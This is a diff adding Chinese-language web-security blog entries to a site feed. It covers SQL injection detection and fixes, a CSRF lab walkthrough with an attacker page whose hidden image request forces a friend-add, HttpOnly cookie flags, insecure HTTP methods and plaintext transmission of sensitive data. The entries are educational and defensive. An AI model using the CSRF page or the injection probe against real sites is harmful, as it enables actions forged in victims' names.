+<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">http://xxx/abc.php?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果页面返回错误，则存在Sql注入。无论是字符型还是数字型都会因为单引号个数不匹配而报错。</p>
+<h4 id="七、Sql注入修复建议"><a href="#七、Sql注入修复建议" class="headerlink" title="七、Sql注入修复建议"></a>七、Sql注入修复建议</h4><p>常见的Sql注入漏洞的修复方法有两种：</p>
+<ol>
+<li><p>过滤危险字符</p>
+<p>多数CMS都采用过滤危险字符的方式，如采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。使用过滤的方式，在一定程度上可以防止SQL注入漏洞，但仍存在被绕过的可能。</p>
+</li>
+<li><p>使用预编译语句</p>
+<p>使用PDO预编译语句，需注意不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增、删、改、查。</p>
+</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>注入类</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：CSRF跨站</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACSRF%E8%B7%A8%E7%AB%99/</url>
+    <content><![CDATA[<p><em>【APP服务端安全的注入类检测】</em></p>
+<ul>
+<li>html代码模拟提交form表单，查看功能提交结果</li>
+</ul>
+<p><strong>严重性</strong>：中</p>
+<h3 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h3><p>CSRF(Cross-site request forgery)，中文名称：跨站请求伪造，也被称为：one click attack/session riding,缩写：CSRF/XSRF;</p>
+<p>CSRF跨站攻击涉及三个角色：受信任的网站（Collabtive)、受害者的session或cookie和恶意网站。当受害者与受信任的站点拥有一个活跃的会话的同时，如果访问恶意网站，恶意网站会注入一个HTTP请求到受信任的站点，从而破坏用户的信息。</p>
+<h3 id="二、危害"><a href="#二、危害" class="headerlink" title="二、危害"></a>二、危害</h3><p>个人隐私泄露以及财产安全，以受害者的名义发送邮件、消息、盗取账号，甚至于购买商品，虚拟货币转账等。</p>
+<h3 id="三、CSRF攻击过程有以下两个重点"><a href="#三、CSRF攻击过程有以下两个重点" class="headerlink" title="三、CSRF攻击过程有以下两个重点"></a>三、CSRF攻击过程有以下两个重点</h3><ul>
+<li>目标用户已经登录了网站，能够执行网站的功能</li>
+<li>目标用户访问了攻击者构造的URL </li>
+</ul>
+<h3 id="四、环境搭建"><a href="#四、环境搭建" class="headerlink" title="四、环境搭建"></a>四、环境搭建</h3><ol>
+<li><p>启动mysql服务器</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo mysqld_safe</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>启动服务</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo service apache2 start</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>配置DNS解析</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></tbody></table></figure>
+
+<p>添加以下内容：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">127.0.0.1                        www.csrflabattacker.com</span><br><span class="line">127.0.0.1                        www.csrflabelgg.com</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>网站配置</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim /etc/apache2/conf.d/lab.conf</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName www.csrflabattacker.com</span><br><span class="line">DocumentRoot /var/www/CSRF/Attacker/</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">ServerName www.csrflabelgg.com</span><br><span class="line">DocumentRoot /var/www/CSRF/elgg/</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>重启服务：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo service apache2 restart</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>打开Firefox浏览器，分别对<a href="http://www.csrflabattacker.com和www.csrflabelgg.com进行测试访问" target="_blank" rel="noopener">www.csrflabattacker.com和www.csrflabelgg.com进行测试访问</a></p>
+</li>
+<li><p>登录账号</p>
+<table>
+<thead>
+<tr>
+<th>user</th>
+<th>UserName</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Admin</td>
+<td>admin</td>
+<td>seedelgg</td>
+</tr>
+<tr>
+<td>Alice</td>
+<td>alice</td>
+<td>seedalice</td>
+</tr>
+<tr>
+<td>Boby</td>
+<td>boby</td>
+<td>seedboby</td>
+</tr>
+<tr>
+<td>Charlie</td>
+<td>charlie</td>
+<td>seedcharlie</td>
+</tr>
+<tr>
+<td>Samy</td>
+<td>samy</td>
+<td>seedsamy</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>安装live http headers工具</p>
+<p>下载地址：<a href="http://labfile.oss.aliyuncs.com/courses/304/live_http_headers.xpi" target="_blank" rel="noopener">http://labfile.oss.aliyuncs.com/courses/304/live_http_headers.xpi</a></p>
+</li>
+<li><p>打开Firefox浏览器，点击Tools-&gt;Add-ons</p>
+</li>
+<li><p>点击Tools  for all add-ons-&gt;Install add-ons From File…</p>
+</li>
+<li><p>选择Install now，并重启浏览器</p>
+</li>
+<li><p>当tools中出现Live Http headeers即安装成功</p>
+</li>
+<li><p>点击即可就可以使用这个抓包工具，之后访问网站就要可以在窗口中看抓取信息了。</p>
+<p>​     </p>
+</li>
+</ol>
+<h3 id="五、CSRF攻击示例"><a href="#五、CSRF攻击示例" class="headerlink" title="五、CSRF攻击示例"></a>五、CSRF攻击示例</h3><p>用户Alice想和Boby成为好友，但Alice拒绝添加Boby。这时候Boby向Alice发送一个URL，当Alice访问URL即自动将Boby添加到好友列表中。</p>
+<ol>
+<li><p>如何添加好友</p>
+</li>
+<li><p>分析抓取到的数据包</p>
+<ol>
+<li><p>添加Boby用户的连接</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">http://www.csrflabelgg.com/action/friends/add?friend=40&amp;__elgg_ts=1524817660&amp;__elgg_token=f581b9c0b6fab2aa1c5b5c64a7b4cf0c</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>构造一个页面，让Alice访问，就会点击boby添加为好友</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo vim /var/www/CSRF/Attacker/hack.html</span><br></pre></td></tr></tbody></table></figure>
+
+<p>代码如下：</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.csrflabelgg.com/action/friends/add?friend=40&amp;__elgg_ts=1524817660&amp;__elgg_token=f581b9c0b6fab2aa1c5b5c64a7b4cf0c"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+</li>
+<li><p>访问之前</p>
+</li>
+</ol>
+<p>   Alice访问<a href="http://www.csrflabattacker.com/hack.html" target="_blank" rel="noopener">www.csrflabattacker.com/hack.html</a></p>
+<ol>
+<li>访问之后，查看<a href="http://www.csrflabelgg.com/firends/alice" target="_blank" rel="noopener">www.csrflabelgg.com/firends/alice</a></li>
+</ol>
+<h3 id="六、CSRF漏洞修复建议"><a href="#六、CSRF漏洞修复建议" class="headerlink" title="六、CSRF漏洞修复建议"></a>六、CSRF漏洞修复建议</h3><ul>
+<li>验证请求的Referer值，如果Referer是以自己的网站开头的域名，则说明该请求来自于网站自己，是合法的。如果Referer是其他网站域名或空白，就有可能是CSRF攻击，那么服务器应拒绝该请求，但是此方法存在被绕过的可能。</li>
+<li>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，防御CSRF的关键在于：在请求中放入攻击者不能伪造的信息。例如可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端验证token，如果请求中没有token或者token的内容不正确，则认为该请求可能是CSRF攻击而拒绝该请求。</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：Cookie上未设置HttpOnly Flag</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACookie%E4%B8%8A%E6%9C%AA%E8%AE%BE%E7%BD%AEHttpOnly-Flag/</url>
+    <content><![CDATA[<p>严重性：Low</p>
+<ul>
+<li><strong>HttpOnly&amp;Secure Flag</strong></li>
+</ul>
+<ol>
+<li>httpOnly flag设定时：Cookie只能被服务端存取，无法在用户端读取</li>
+<li>secure flag设定时：Cookie只能通过https的方式传输</li>
+</ol>
+<ul>
+<li><p><strong>设置Response Header的flag可以对cookie多一层防护，避免像XSS，Session hijacking之类的攻击。</strong></p>
+<p><img src="https://www.ajoshow.com/wp-content/uploads/2.bp_.blogspot.com/1JtL9rG38nI/VpfSwL9-gZI/AAAAAAAAA_w/R6b3UxCO2lU/s640/2016-01-15_005314.png" alt="img"> </p>
+</li>
+<li><p><strong>如何取得Cookie</strong></p>
+<ol>
+<li>Request.getCookies： 回传Cookies，来自当下用户端请求（Request)里。<a href="https://docs.oracle.com/javaee/1.2.1/api/javax/servlet/http/HttpServletRequest.html#getCookies%28%29" target="_blank" rel="noopener">【参考】</a></li>
+<li>Request.getHeader(“Cookie”)：来自服务端上次回传Response的Set-Cookie <a href="https://docs.oracle.com/javaee/1.2.1/api/javax/servlet/http/HttpServletRequest.html#getCookies%28%29" target="_blank" rel="noopener">【参考】</a></li>
+</ol>
+</li>
+<li><p><strong>Cookie和Seesion Cookie的区别</strong></p>
+</li>
+</ul>
+<ol>
+<li>Session Cookie是没有expiry date的，会话结束时一并删除掉。expiry date也称persistent cookie。</li>
+<li>Cookie是存放在用户端，session存在在服务器端，用来记录非常小量的资料。</li>
+</ol>
+<ul>
+<li><strong>为什么用户端和服务端看到值不同</strong></li>
+</ul>
+<p><u>[步骤模拟]</u></p>
+<p>Step1. 用户端存储一个cookie，key: email  value: <a href="mailto:Test@gaiaworks.cn">Test@gaiaworks.cn</a></p>
+<p>Step2. 用户端第一次请求至服务端，服务端利用Request.getCookies()方法里面取出的email cookie值是Test。利用header Cookie（）拿到的值是null。</p>
+<p>Step3. 服务端为保证安全，回传时会将所有Cookie都带上HttpOnly和Secure的Flags。</p>
+<p>Step4. 用户端尝试第二次请求，此时Email Cookie值依然是<a href="mailto:Test@gaiaworks.cn">Test@gaiaworks.cn</a></p>
+<p>Step5. 服务端从Request.getCookies()方法拿到的email Cookie值依然是Test；此时header Cookie（）拿到的值也是Test。</p>
+<ul>
+<li><strong>为什么服务端看到的值不是<a href="mailto:Test@gaiaworks.cn">Test@gaiaworks.cn</a></strong><ul>
+<li>Http Cooki如果version为0，则value不能含有@。如果version为1，则会有双引号。</li>
+<li>Response中的hearder里的Set-Cookie改变用户端的email Cookie的value，使其为Test。所以Header Cookie第二次拿到的结果是Test。</li>
+<li>如果服务端没有Set-Cookie步骤，则第二次header cookie拿到的Email cookie的Value是<a href="mailto:Test@gaiaworks.cn">Test@gaiaworks.cn</a></li>
+<li>设定的HttpOnly造成用户端无法读取这个Cookie（例Javascript)。</li>
+</ul>
+</li>
+<li><strong>处理Cookie的重点如下</strong><ul>
+<li>后端只需要对自己用到的seesion cookie做httpOnly，不包含前端的Cookies。</li>
+<li>前端要对一些敏感性的Cookie做加密或者编码处理，并且要避免特殊符号文字。</li>
+<li>设定secure flag保证Cookies只能在https中进行出传输。</li>
+</ul>
+</li>
+<li><strong>secure flag和httpOnly设定的方法（java)</strong></li>
+</ul>
+<ol>
+<li>Cookie Interface<ul>
+<li>Cookie cookie = getMyCookie(“cookieName”);</li>
+<li>cookie.serHttpOnly(true);</li>
+<li>cookie.setSecure(true);</li>
+<li>resp.addCookie(cookie);</li>
+</ul>
+</li>
+<li>Response header<ul>
+<li>String sessionid = request.getSession().getId()；</li>
+<li>response.setHeader(“SET-COOKIE”，“JSESSIONID=”+sessionid+”;httpOnly;secure”);</li>
+</ul>
+</li>
+<li>web.xml<ul>
+<li>&lt; session-config&gt;</li>
+<li>&lt; cookie-config&gt;</li>
+<li>&lt; http-only&gt; true&lt; /http-only&gt;</li>
+<li>&lt; secure&gt;true</li>
+<li>&lt; /cookie-config&gt;</li>
+<li>&lt; /session-config&gt;</li>
+</ul>
+</li>
+<li>Tomcat context.xml<ul>
+<li>&lt; Context useHttpOnly = “true”&gt;</li>
+<li>…….</li>
+<li>&lt; /Context&gt;</li>
+</ul>
+</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：启用不安全的HTTP方法</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E5%90%AF%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84HTTP%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：使用options查看是否启用了PUT、delete、TRACE等方法</p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>不安全的HTTP方法是指开发人员、运维人员可能用于调试服务器，开启了一些客户端能够直接读写服务器端文件的方法，例如：DELETE、PUT、COPY、MOVE、PROPFIND、PROPPATCH、SEARCH、LOCK、UNLOCK等HTTP协议支持的方法。</p>
+<p>开启不安全的HTTP方法可同通过浏览器直接读写服务器端文件。</p>
+<h3 id="0x01-HTTP请求方法"><a href="#0x01-HTTP请求方法" class="headerlink" title="0x01 HTTP请求方法"></a>0x01 HTTP请求方法</h3><p>HTTP 1.1协议支持9种请求方法，分别如下</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PUT</td>
+<td>请求指定的页面信息，并返回实体主体</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>向指定资源提交数据进行处理请求。数据被包含在请求体中。POST请求可能会导致新的资源的建立或修改已有资源。</td>
+</tr>
+<tr>
+<td>HEAD</td>
+<td>类似于GET请求，区别在于返回的响应中无具体的内容，用于获得HTTP报头</td>
+</tr>
+<tr>
+<td>PUT</td>
+<td>从客户端向服务器传送的数据取代指定的文档的内容</td>
+</tr>
+<tr>
+<td>DELETE</td>
+<td>删除指定的资源</td>
+</tr>
+<tr>
+<td>CONNECT</td>
+<td>建立一个到由目标资源标识的服务器的隧道</td>
+</tr>
+<tr>
+<td>OPTIONS</td>
+<td>用于描述目标资源的通信选项</td>
+</tr>
+<tr>
+<td>TRACE</td>
+<td>沿着到目标资源的路径执行一个消息环回测试。回显服务器收到的请求，主要用来测试或诊断。</td>
+</tr>
+<tr>
+<td>PATCH</td>
+<td>是对PUT方法的补充，用来对已知资源进行局部更新</td>
+</tr>
+</tbody></table>
+<h3 id="0x02-检测方法"><a href="#0x02-检测方法" class="headerlink" title="0x02 检测方法"></a>0x02 检测方法</h3><p>利用curl命令进行测试。curl命令是一个利用url规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。curl还可以做网页处理流程和数据检索自动化。</p>
+<p><u>注：curl命令语法</u>   <a href="https://man.linuxde.net/curl" target="_blank" rel="noopener">https://man.linuxde.net/curl</a></p>
+<ul>
+<li><p><strong>使用CURL发送OPTIONS请求，查看响应头中的Allow行</strong></p>
+<p>命令：curl -I -X OPTIONS <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></p>
+<p>若出现PUT、DELETE……等方法，则存在安全风险。</p>
+</li>
+<li><p><strong>HTTP方法测试</strong></p>
+<p>测试方法：</p>
+<ol>
+<li>打开webscarab，打开manual request这个标签</li>
+<li>在Request的Parsed的Method中填入OPTIONS</li>
+<li>在URL中填写待测试的网站地址</li>
+<li>在Version中填入HTTP 1.0或者HTTP 1.1</li>
+<li>完善之后点击Fetch Response按钮</li>
+<li>查看其响应</li>
+</ol>
+<p>注：其他方法测试同上。</p>
+</li>
+</ul>
+<h3 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h3><ul>
+<li><p><strong>IIS</strong></p>
+<p>修改站点权限，取消“写入”</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-18/0x01.gif" alt="0x01"></p>
+</li>
+</ul>
+<ul>
+<li><p><strong>Tomcat</strong></p>
+<p>修改web.xml</p>
+<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>fortune<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>PUT<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>DELETE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>HEAD<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>OPTIONS<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>TRACE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span><span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">login-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p><strong>Nginx</strong></p>
+<p>在server代码块中写入如下代码，用于屏蔽非GET、POST请求：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($request_method !~* GET|POST){</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">403</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：敏感数据明文传输</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93/</url>
+    <content><![CDATA[<p>严重性：High</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：</p>
+<ul>
+<li><p>认证数据（包括用户名和密码）应加密传输：可采用加密的传输通道，或者以摘要方式传输，“互联网传输的BS架构应用应采用VPN链路加密或HTTPS（应采用TLS加密，适用于交易、支付类的关键应用系统的敏感数据页面或域名）”，互联网传输的CS架构应用应采用加密方式传输；</p>
+</li>
+<li><p>应保证密钥分发存储及加密算法的安全：</p>
+<p>a). 应保证密钥的存储、传输安全；</p>
+<p>b). 密钥保存在终端时应定期更换；</p>
+<p>c). 系统所采用的各类加密算法（对称算法、非对称算法、摘要算法等）应使用《IT安全技术标准》中所推荐的算法；</p>
+<p>d). 不得使用自定义算法。</p>
+</li>
+<li><p>登入过程口令加密（HASH），密码存储强度SHA 256以上</p>
+</li>
+</ul>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>敏感信息明文传输就是在网站上提交敏感数据到服务器的过程中未进行相关加密处理，导致攻击者通过中间人攻击方式（劫持、嗅探等）即可获得到这些未加密的敏感数据。</p>
+<p>HTTPS方式解决敏感明文传输也不是绝对安全的，当遭受中间人劫持攻击的时候也会获取到传输中的明文信息（中间人劫持攻击的关键必须让客户端信任中间人的证书，否则攻击无效，所以攻击难度大）。</p>
+<h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p>敏感信息明文传输在网站上传输敏感信息时，未作加密处理，导致攻击者可以利用中间人攻击（劫持、嗅探等）即可获得这些未加密的数据。当攻击者获得到这些数据后，就可以利用这些信息进入到应用系统中，一旦进入到系统之后，就可以获得更多的敏感信息，以及获取更多的漏洞。</p>
+<h3 id="0x02-密钥安全周期"><a href="#0x02-密钥安全周期" class="headerlink" title="0x02 密钥安全周期"></a>0x02 密钥安全周期</h3><p><strong>密钥生命周期</strong>：<u>生成、分发、更新、存储、备份、销毁</u></p>
+<h4 id="1-生成"><a href="#1-生成" class="headerlink" title="1. 生成"></a>1. 生成</h4><ul>
+<li>基于安全的随机数生成器</li>
+<li>基于密钥导出函数（KDF）</li>
+<li>基于标准的密钥协商机制</li>
+<li>基于安全的密钥生成工具等</li>
+</ul>
+<h4 id="2-分发"><a href="#2-分发" class="headerlink" title="2. 分发"></a>2. 分发</h4><p>密钥的分发是将密钥通过安全的方式传送到被授权的实体，一般通过安全传输协议或者使用数字信封等方式来完成。【注：数字信封是对称密码体制和非对称密码体制的一种混合应用，即解决了非对称密码体制加解密效率的问题，又妥善解决了密钥传送的安全问题。】</p>
+<h4 id="3-使用"><a href="#3-使用" class="headerlink" title="3. 使用"></a>3. 使用</h4><ul>
+<li>一个密钥只用于一个用途（如：加密、认证、随机数生成和数字签名等）。</li>
+<li>非对称加密算法私钥仅可被其拥有者掌握。</li>
+</ul>
+<h4 id="4-存储"><a href="#4-存储" class="headerlink" title="4. 存储"></a>4. 存储</h4><ul>
+<li>用于数据加解密的工作密钥不可硬编码在代码中</li>
+<li>对称密钥、私钥、共享密码等均属于敏感数据，在本地存储时均需要提供机密性保护（上层密钥的机密性保护由下层密钥提供–&gt;根密钥的安全管理）</li>
+<li>密钥组件方式生成根密钥时，密钥组件需要分散存储，当密钥组件存储于文件中时，须对文件名做一般化处理。</li>
+</ul>
+<h4 id="5-更新"><a href="#5-更新" class="headerlink" title="5. 更新"></a>5. 更新</h4><p>当密码已经达到其使用期限或者已经密钥已经被破解时，密码系统需要有密钥更新机制来重新产生新的密钥。</p>
+<p><strong>注：密钥须支持可更新，并明确更新周期。</strong></p>
+<h4 id="6-备份"><a href="#6-备份" class="headerlink" title="6. 备份"></a>6. 备份</h4><p>密钥丢失时导致密文数据无法解密，便导致了数据的丢失。</p>
+<p>针对不同的场景，可考虑是否需要对密钥提供备份于恢复机制。</p>
+<h4 id="7-销毁"><a href="#7-销毁" class="headerlink" title="7. 销毁"></a>7. 销毁</h4><p>不再使用的密钥应当立即销毁。</p>
+<p><strong>可审核</strong>：密钥管理操作需要记录详细日志。密钥的生成、使用、更新、销毁操作是重要的管理操作。日志种需要详细记录密钥的各项管理操作，包括但不限于记录操作的主体（人或设备）、时间、目的、结果等可用于时间追朔的信息。</p>
+<h3 id="0x03-检验方法"><a href="#0x03-检验方法" class="headerlink" title="0x03 检验方法"></a>0x03 检验方法</h3><p>检验敏感数据是否是明文传输，有很多方式，现在介绍两种，一是使用抓包工具，抓包工具有很多，推荐使用Burp suite或者Fiddler等，抓取Https的数据包时需要额外的配置，比如安装CA证书等。二是使用浏览器自带的功能。推荐使用浏览器自带功能。</p>
+<ul>
+<li>火狐浏览器的F12功能查看Github登录密码传输方式</li>
+<li>利用Burp suite抓包，查看抓包Github登录密码数据</li>
+</ul>
+<h3 id="0x04-漏洞实例"><a href="#0x04-漏洞实例" class="headerlink" title="0x04 漏洞实例"></a>0x04 漏洞实例</h3><p> <a href="http://jira.gaiaworks.cn:8089/browse/UC-95" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/UC-95</a> </p>
+<p> <a href="http://jira.gaiaworks.cn:8089/browse/UC-956" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/UC-956</a></p>
+<p> <a href="http://jira.gaiaworks.cn:8089/browse/W3-8251" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/W3-8251</a> </p>
+<p> <a href="http://jira.gaiaworks.cn:8089/browse/MPD-13561" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/MPD-13561</a> </p>
+<p> <a href="http://jira.gaiaworks.cn:8089/browse/W3-8284" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/W3-8284</a> </p>
+<p>……</p>
+<h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><ol>
+<li>使用HTTPS来确保传输的安全，因为使用Https中间人嗅探完全是乱码</li>
+<li>认证数据、敏感数据使用加密传输。如认证数据采用不可逆Hash+salt，要保证同一密码的密文每次都不同，防止重放攻击。</li>
+<li>不要轻易运行陌生人发来的软件，安装软件时也需谨慎，防止捆绑有恶意软件</li>
+<li>设置浏览器为不使用任何代理，主要是不要使用默认的系统代理，即IE代理。</li>
+<li>对服务器进行安全加固，防止利用服务器漏洞进行攻击</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：敏感数据GET传输</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AEGET%E4%BC%A0%E8%BE%93/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：</p>
+<ul>
+<li>不要在URL中暴露会话标识符，会话标识应当只出现在http头信息中，不要将会话标识符以GET参数进行传递</li>
